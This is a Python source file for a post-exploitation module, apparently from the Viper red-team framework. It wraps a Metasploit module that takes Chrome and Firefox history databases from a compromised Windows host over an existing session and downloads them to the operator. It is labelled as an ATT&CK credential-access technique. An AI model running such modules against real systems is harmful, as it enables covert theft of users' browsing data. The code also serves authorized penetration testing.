# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :


from PostModule.lib.ModuleTemplate import TAG2CH, PostMSFRawModule


class PostModule(PostMSFRawModule):
    NAME = "获取主机浏览器历史记录"
    DESC = "模块支持收集Chrome,Firefox浏览器存储历史记录的sqlite数据文件,\n" \
           "收集到的数据库文件可通过<文件列表>查看"
    MODULETYPE = TAG2CH.Credential_Access
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM", ]  # 所需权限
    ATTCK = ["T1217"]  # ATTCK向量
    REFERENCES = ["https://attack.mitre.org/techniques/T1217/"]
    AUTHOR = "Viper"

    REQUIRE_SESSION = True
    OPTIONS = []

    def __init__(self, sessionid, hid, custom_param):
        super().__init__(sessionid, hid, custom_param)
        self.type = "post"
        self.mname = "windows/gather/forensics/browser_history_api"

    def check(self):
        """执行前的检查函数"""
        from PostModule.lib.Session import Session
        session = Session(self._sessionid)
        if session.is_alive:
            return True, None
        else:
            return False, "当前Session不可用"

    def callback(self, status, message, data):
        if status:
            if len(data) == 0:
                self.log_status("主机未使用chrome或firefox浏览器")
                return

            for one in data:
                self.log_good("浏览器: {}".format(one.get("name")))
                self.log_good("文件路径: {}".format(one.get("remotepath")))
                self.log_good("下载到本地文件名: {}".format(one.get("locatfilename")))
                self.log_raw('\n')
            self.log_status("模块执行完成")
        else:
            self.log_error("模块执行失败")
            self.log_error(message)
